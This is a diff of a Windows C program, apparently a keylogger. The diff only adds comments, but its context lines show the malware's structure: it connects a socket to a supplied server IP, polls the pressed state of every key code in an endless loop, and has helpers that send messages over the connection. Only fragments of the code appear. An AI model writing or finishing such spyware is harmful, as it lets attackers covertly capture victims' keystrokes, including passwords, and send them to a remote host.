@@ -6,7 +6,7 @@
 #include <windows.h>
 #include <winuser.h>
 
-// this file still needs fixing
+
 
 void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip);
 void startWinsock(WSADATA *wsaData);
@@ -16,6 +16,8 @@ void sendMsg(SOCKET client_socket, const char *msg);
 void closeSocket(SOCKET client_socket);
 
 int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
+    
+    // socket details and setup
     SOCKET client_socket;
     struct sockaddr_in serv_addr;
     WSADATA wsaData;
@@ -32,8 +34,10 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
 void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip) {
 
+    // connect to the server via socket
     connectToServer(serv_addr, client_socket, server_ip);
 
+    // constantly loop through all the characters and check if they are currently being pressed or not
     char c;
     while (1) {
         for (c = 0; c < 255; c++) {
@@ -76,6 +80,7 @@ void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const cha
     }
 }
 
+// function to initialize Winsock so that we can use sockets
 void startWinsock(WSADATA *wsaData) {
     if (WSAStartup(MAKEWORD(2, 2), wsaData) != 0) {
         printf("WSAStartup failed\n");
@@ -83,6 +88,7 @@ void startWinsock(WSADATA *wsaData) {
     }
 }
 
+// function to start the socket and handles errors
 SOCKET startSocket() {
     SOCKET client_socket = socket(AF_INET, SOCK_STREAM, 0);
     if (client_socket < 0) {
@@ -95,6 +101,7 @@ SOCKET startSocket() {
     return client_socket;
 }
 
+// function to connect this client to the server via socket
 void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip) {
 
     if (inet_pton(AF_INET, server_ip, &serv_addr->sin_addr) <= 0) {
@@ -113,6 +120,7 @@ void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket, const 
     }
 }
 
+// function to send message via socket connection
 void sendMsg(SOCKET client_socket, const char *msg) {
     int sent = send(client_socket, msg, strlen(msg), 0);
     if (sent == -1){
@@ -122,6 +130,7 @@ void sendMsg(SOCKET client_socket, const char *msg) {
     }
 }
 
+// function to close the socket and clean up the resources that are no longer being used
 void closeSocket(SOCKET client_socket) {
     closesocket(client_socket);
     WSACleanup();
